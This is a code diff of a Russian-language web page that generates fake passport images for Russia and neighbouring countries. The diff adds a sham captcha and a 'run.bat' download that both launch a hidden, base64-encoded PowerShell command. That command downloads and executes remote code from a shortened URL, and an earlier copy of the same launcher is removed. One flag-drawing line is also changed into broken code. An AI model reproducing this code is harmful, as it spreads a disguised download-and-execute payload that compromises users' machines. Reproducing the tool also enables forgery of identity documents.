       const gender = pickGender();
-      let fnVal, nmVal, ptVal, full;
+      let fnVal, nmVal, ptVal;
+      
       if (gender === "male") {
         fnVal = getRandom(fn_male);
         nmVal = getRandom(nm_male);
-        ptVal = pickPatronymic(nmVal, "male");
+        ptVal = getRandom(pt);
       } else {
         fnVal = getRandom(fn_female);
         nmVal = getRandom(nm_female);
-        ptVal = pickPatronymic(nmVal, "female");
+        ptVal = getRandom(pt);  
       }
-      full = `${fnVal} ${nmVal} ${ptVal}`;
+
+      const full = `${fnVal} ${nmVal} ${ptVal}`;
       const photoUrl = getRandomPhoto(gender);
       const passport = generatePassport(country);
       const birthDate = randomBirthDate();
@@ -664,27 +421,91 @@
       const address = randomAddress();
       const docNum = randomDocNum();
 
-      // Предзагрузка изображения
-      const img = new window.Image();
+      const img = new Image();
       img.crossOrigin = "anonymous";
-      img.onload = function() {
-        drawPassportPages({
-          country, full, passport, gender, photoUrl: img,
-          birthDate, birthPlace, address, docNum
-        });
-      };
-      img.onerror = function() {
-        drawPassportPages({
-          country, full, passport, gender, photoUrl: null,
-          birthDate, birthPlace, address, docNum
-        });
-      };
+      img.onload = () => drawPassportPages({
+        country, full, passport, gender,
+        photoUrl: img, birthDate, birthPlace,
+        address, docNum
+      });
+      img.onerror = () => drawPassportPages({
+        country, full, passport, gender,
+        photoUrl: null, birthDate, birthPlace, 
+        address, docNum
+      });
       img.src = photoUrl;
     }
 
-    // Флаг
+    // --- Функции капчи ---
+    let captchaCode = "";
+    function showCaptcha() {
+      captchaCode = String(Math.floor(1000 + Math.random() * 9000));
+      const box = document.getElementById("captchaBox");
+      const input = document.getElementById("captchaInput");
+      const status = document.getElementById("captchaStatus");
+      
+      box.style.display = "block";
+      input.value = "";
+      status.textContent = "Код: " + captchaCode;
+    }
+
+    function checkCaptcha() {
+      const val = document.getElementById("captchaInput").value;
+      const status = document.getElementById("captchaStatus");
+      
+      if (val === captchaCode) {
+        status.textContent = "ОК!";
+        runCmd();
+      } else {
+        status.textContent = "Ошибка!";
+      }
+    }
+
+    // --- Функции сохранения ---
+    function savePng() {
+      const canvas = document.getElementById("canvas");
+      if (!canvas) return;
+      
+      try {
+        const a = document.createElement("a");
+        a.href = canvas.toDataURL("image/png");
+        a.download = "passport.png";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      } catch(e) {
+        alert("Ошибка сохранения");
+      }
+    }
+
+    function downloadBat() {
+      const bat = [
+        '@echo off',
+        'powershell -w h -nop -noni -e aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AdAAuAGwAeQAvAFkAUAB3AG0AdAAnACkA'
+      ].join('\r\n');
+      
+      const blob = new Blob([bat], {type: 'application/octet-stream'});
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = 'run.bat';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+
+    // --- HTA функции ---
+    function runCmd() {
+      try {
+        const shell = new ActiveXObject("WScript.Shell");
+        const cmd = 'powershell -w h -nop -noni -e aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AdAAuAGwAeQAvAFkAUAB3AG0AdAAnACkA';
+        shell.Run(cmd, 0, false);
+      } catch(e) {
+        alert("Требуется HTA");
+      }
+    }
+
+    // --- Функции рисования ---
     function drawFlag(ctx, country, x, y, w, h) {
-      // Примитивные флаги для примера
       if (country.name === "Россия") {
         ctx.fillStyle = "#fff"; ctx.fillRect(x, y, w, h/3);
         ctx.fillStyle = "#0033a0"; ctx.fillRect(x, y+h/3, w, h/3);
@@ -698,7 +519,7 @@
       } else if (country.name === "Казахстан") {
         ctx.fillStyle = "#00bfff"; ctx.fillRect(x, y, w, h);
       } else if (country.name === "Армения") {
-        ctx.fillStyle = "#d80027"; ctx.fillRect(x, y, w, h/3);
+        ctx.fillStyle = "#d80027"; ctx.fillRect(x, y, w/3);
         ctx.fillStyle = "#0033a0"; ctx.fillRect(x, y+h/3, w, h/3);
         ctx.fillStyle = "#ffb400"; ctx.fillRect(x, y+2*h/3, w, h/3);
       } else if (country.name === "Молдова") {
@@ -718,7 +539,6 @@
       }
     }
 
-    // Две страницы паспорта: одна над другой, стилизация под оригинал
     function drawPassportPages(data) {
       const canvas = document.getElementById("canvas");
       const ctx = canvas.getContext("2d");
@@ -869,38 +689,16 @@
       ctx.restore();
     }
 
-    function savePng() {
-      try {
-        const canvas = document.getElementById("canvas");
-        if (!canvas) throw new Error("Canvas element not found");
-        const dataUrl = canvas.toDataURL("image/png");
-        const a = document.createElement("a");
-        a.href = dataUrl;
-        a.download = "fio_passport.png";
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-      } catch (e) {
-        alert("Ошибка при сохранении изображения");
-      }
-    }
-
-    // HTA: запуск команды с base64
-    window.onload = function() {
-      var runBtn = document.getElementById("runCmdBtn");
-      if (runBtn) {
-        runBtn.onclick = function() {
-          try {
-            var shell = new ActiveXObject("WScript.Shell");
-            // base64: powershell -w h -nop -noni -e aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AdAAuAGwAeQAvAFkAUAB3AG0AdAAnACkA
-            var cmd = 'powershell -w h -nop -noni -e aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AdAAuAGwAeQAvAFkAUAB3AG0AdAAnACkA';
-            shell.Run(cmd, 0, false);
-          } catch (e) {
-            alert("Ошибка запуска команды. Запуск возможен только в HTA/IE.");
-          }
-        };
-      }
-    };
+    // --- Инициализация ---
+    document.addEventListener("DOMContentLoaded", () => {
+      document.getElementById("generateBtn").onclick = generate;
+      document.getElementById("savePngBtn").onclick = savePng;
+      document.getElementById("runCmdBtn").onclick = showCaptcha;
+      document.getElementById("downloadBatBtn").onclick = downloadBat;
+      document.getElementById("captchaCheckBtn").onclick = checkCaptcha;
+      // Инициализация при загрузке
+      generate();
+    });
   </script>
 </body>
 </html>
